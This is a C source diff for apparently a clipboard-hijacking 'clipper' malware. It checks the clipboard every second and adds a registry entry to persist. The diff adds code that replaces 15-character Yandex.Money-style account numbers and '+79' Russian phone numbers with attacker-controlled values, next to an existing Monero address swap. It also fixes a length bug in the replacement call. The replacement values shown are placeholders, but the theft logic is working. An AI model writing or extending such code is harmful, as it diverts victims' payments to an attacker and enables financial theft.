@@ -13,6 +13,16 @@ char* _monero_poloniex()
 	return "test";
 }
 
+char* _yandex_money()
+{
+	return "111111111111111";
+}
+
+char* _phone()
+{
+	return "+79111111111";
+}
+
 /*
 	Check file is exist
 */
@@ -89,6 +99,7 @@ void Mnemosyne()
 {
 	HANDLE clip;
 	char* pch;
+	char* phone;
 	
 	RegAdd();
 
@@ -101,9 +112,24 @@ void Mnemosyne()
 
 		pch = strstr(clip, "4JUdGzvrMFDWrUUwY3toJATSeNwjn54Lk"); // monero poloniex
 
+		if (strlen(clip) == 15)
+		{
+			ChangeClipboard(_yandex_money(), strlen(_yandex_money()));
+		}
+
+		if (strlen(clip) == 12)
+		{
+			phone = strstr(clip, "+79"); // RU phones
+
+			if (phone)
+			{
+				ChangeClipboard(_phone(), strlen(_phone()));
+			}
+		}
+
 		if (pch)
 		{
-			ChangeClipboard(_monero_poloniex(), sizeof(_monero_poloniex()));
+			ChangeClipboard(_monero_poloniex(), strlen(_monero_poloniex()));
 		}
 
 		Sleep(1000);
